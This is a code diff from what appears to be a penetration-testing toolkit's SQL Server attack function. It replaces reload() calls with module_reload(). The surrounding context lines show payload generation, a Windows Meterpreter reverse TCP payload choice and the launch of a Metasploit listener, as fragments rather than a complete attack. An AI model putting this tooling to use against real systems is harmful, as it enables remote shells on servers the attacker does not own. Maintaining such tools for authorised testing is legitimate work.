@@ -139,7 +139,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
     # if we don't have powershell
     if option == "2":
         try:
-            reload(src.core.payloadgen.create_payloads)
+            module_reload(src.core.payloadgen.create_payloads)
         except:
             import src.core.payloadgen.create_payloads
         print_status("Connection established with SQL Server...")
@@ -175,7 +175,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
         if not os.path.isfile(setdir + "/set.payload"):
             if operating_system == "posix":
                 try:
-                    reload(pexpect)
+                    module_reload(pexpect)
                 except:
                     import pexpect
                 print_status("Starting the Metasploit listener...")
@@ -211,7 +211,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
         filewrite.write("windows/meterpreter/reverse_tcp" + " " + port + ",")
         filewrite.close()
         try:
-            reload(src.payloads.powershell.prep)
+            module_reload(src.payloads.powershell.prep)
         except:
             import src.payloads.powershell.prep
         # create the directory if it does not exist
@@ -240,7 +240,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
         msf_path = meta_path()
         if operating_system == "posix":
             try:
-                reload(pexpect)
+                module_reload(pexpect)
             except:
                 import pexpect
             print_status("Starting the Metasploit listener...")
@@ -332,7 +332,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
     # thread is needed here due to the connect not always terminating thread,
     # it hangs if thread isnt specified
     try:
-        reload(thread)
+        module_reload(thread)
     except:
         import thread
 
